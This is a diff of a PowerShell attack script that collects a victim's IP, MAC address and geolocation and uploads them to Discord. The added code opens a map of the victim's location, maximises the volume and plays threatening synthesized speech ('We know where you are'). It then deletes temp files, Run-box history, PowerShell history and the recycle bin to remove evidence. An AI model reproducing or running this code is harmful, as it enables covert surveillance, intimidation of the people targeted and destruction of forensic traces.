@@ -71,13 +71,8 @@ function Get-GeoLocation{
 	if ($GeoWatcher.Permission -eq 'Denied'){
 		Write-Error 'Access Denied for Location Information'
 	} else {
-		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
-		$GL = $GL -split " "
-		$Lat = $GL[0].Substring(11) -replace ".$"
-		$Lon = $GL[1].Substring(10) -replace ".$" 
-		return $Lat, $Lon
-
-
+		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
+		
 	}
 	}
     # Write Error is just for troubleshooting
@@ -87,9 +82,6 @@ function Get-GeoLocation{
     } 
 
 }
-
-$Lat, $Lon = Get-GeoLocation
-
 #------------------------------------------------------------------------------------------------------------------------------------
 
 $output = @"
@@ -148,7 +140,13 @@ $localIP
 MAC:
 $MAC
 
+$GL = Get-GeoLocation
 
+$GL = $GL -split " "
+
+$Lat = $GL[0].Substring(11) -replace ".$"
+
+$Lon = $GL[1].Substring(10) -replace ".$"
 
 $output > $FileName
 
@@ -181,4 +179,50 @@ if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$FileName"}
 
 
 #------------------------------------------------------------------------------------------------------------------------------------
+
+Pause-Script
+
+# Opens their browser with a map of their current location
+
+Start-Process "https://www.latlong.net/c/?lat=$Lat&long=$Lon"
+
+Start-Sleep -s 3
+
+# Sets Volume to max level
+
+$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
+
+# Sets up speech module 
+
+$s=New-Object -ComObject SAPI.SpVoice
+$s.Rate = -2
+$s.Speak("We found you $FN")
+$s.Speak("We know where you are")
+$s.Speak("We are everywhere")
+$s.Speak("Expect us")
+
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
